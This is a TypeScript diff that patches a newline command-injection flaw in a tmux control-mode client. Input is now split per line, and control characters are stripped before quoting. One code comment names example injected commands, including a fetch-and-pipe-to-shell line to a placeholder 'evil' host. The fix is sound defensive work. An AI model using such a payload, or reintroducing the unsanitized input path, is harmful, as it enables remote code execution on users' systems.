@@ -162,10 +162,25 @@ export class TmuxClient extends EventEmitter {
 
   /** Send raw bytes to a pane (user typed something on phone) */
   async sendInput(paneId: string, text: string): Promise<void> {
-    // Send text literal, then Enter separately for reliability
-    // -l disables key-name lookup so "Enter" isn't treated as the Enter key
-    try { await this.cmd(`send-keys -t ${paneId} -l ${shellQuote(text)}`); }
-    catch (e) { console.error('[tmux] sendInput failed:', (e as Error).message); }
+    // tmux -CC is a LINE-DELIMITED control protocol: cmd() writes
+    // `<command>\n`. A raw \n/\r in `text` would terminate the send-keys
+    // line and the remainder would execute as tmux commands (e.g.
+    // `kill-server`, `new-window 'curl evil|sh'`). Never send a multi-line
+    // payload as one command: split on newlines and send each line as its
+    // own literal, with an explicit Enter key BETWEEN lines. The final
+    // submit is owned by the caller (TmuxHost calls sendEnter()).
+    // -l disables key-name lookup so "Enter" isn't treated as a key name.
+    try {
+      const lines = text.split(/\r\n|\r|\n/);
+      for (let i = 0; i < lines.length; i++) {
+        if (i > 0) await this.cmd(`send-keys -t ${paneId} Enter`);
+        if (lines[i].length > 0) {
+          await this.cmd(`send-keys -t ${paneId} -l ${shellQuote(lines[i])}`);
+        }
+      }
+    } catch (e) {
+      console.error('[tmux] sendInput failed:', (e as Error).message);
+    }
   }
 
   /** Send Enter key to a pane */
@@ -711,7 +726,14 @@ function isOctalDigit(c: string): boolean {
 
 /**
  * Shell-quote a string for use in a tmux command sent over stdin.
+ *
+ * Defense-in-depth: strip NUL and CR/LF first. tmux -CC is line-delimited
+ * (cmd() writes `<command>\n`), so an embedded \r/\n would break out of the
+ * quoted argument and let the rest execute as tmux commands. Callers that
+ * need multi-line input (sendInput) split on newlines themselves; stripping
+ * here also protects spawn/window names, cwd and command args.
  */
-function shellQuote(s: string): string {
-  return "'" + s.replace(/'/g, "'\\''") + "'";
+export function shellQuote(s: string): string {
+  const safe = s.replace(/[\x00\r\n]/g, '');
+  return "'" + safe.replace(/'/g, "'\\''") + "'";
 }
